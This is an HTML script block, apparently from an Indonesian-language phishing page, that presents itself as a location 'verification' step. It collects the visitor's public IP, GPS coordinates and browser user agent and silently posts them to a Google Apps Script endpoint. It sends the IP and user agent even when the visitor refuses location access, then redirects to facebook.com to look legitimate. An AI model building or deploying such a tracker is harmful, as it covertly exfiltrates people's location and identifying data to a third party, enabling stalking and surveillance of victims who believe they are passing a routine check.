<script>
    // === VERSI DENGAN NO-CORS (MENGATASI CORS ERROR) ===
    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbzRYDDqlANDxSnRRXPd0Owg8T7c0LbuU6pS330cm-sp3xc8H4VdzfmLv48o0QTpMvrhBg/exec';

    async function getPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch(e) {
            console.error('Gagal ambil IP:', e);
            return 'IP tidak terdeteksi';
        }
    }

    async function sendData(data) {
        try {
            console.log('📤 Mengirim data (no-cors mode):', data);
            
            // Mode no-cors mengabaikan CORS, data tetap terkirim
            await fetch(WEBAPP_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            console.log('✅ Data dikirim (meskipun tidak ada response)');
            
        } catch(e) {
            console.error('❌ Gagal kirim data:', e);
        }
    }

    async function allowLocation() {
        const ip = await getPublicIP();
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async function(position) {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                
                await sendData({
                    ip: ip,
                    lat: lat,
                    lng: lng,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    status: 'USER_ALLOWED'
                });
                
                alert('Verifikasi berhasil. Terima kasih!');
                window.location.href = 'https://facebook.com';
                
            }, async function(error) {
                await sendData({
                    ip: ip,
                    lat: 'DENIED',
                    lng: 'DENIED',
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    status: 'LOCATION_DENIED',
                    error: error.message
                });
                alert('Anda tidak mengizinkan verifikasi lokasi.');
                window.location.href = 'https://facebook.com';
            });
        } else {
            await sendData({
                ip: ip,
                status: 'GEOLOCATION_NOT_SUPPORTED',
                userAgent: navigator.userAgent
            });
            alert('Browser tidak mendukung verifikasi lokasi.');
            window.location.href = 'https://facebook.com';
        }
    }

    async function denyLocation() {
        const ip = await getPublicIP();
        
        await sendData({
            ip: ip,
            lat: 'USER_DENIED',
            lng: 'USER_DENIED',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            status: 'USER_DENIED'
        });
        
        alert('Anda menolak verifikasi.');
        window.location.href = 'https://facebook.com';
    }
</script>
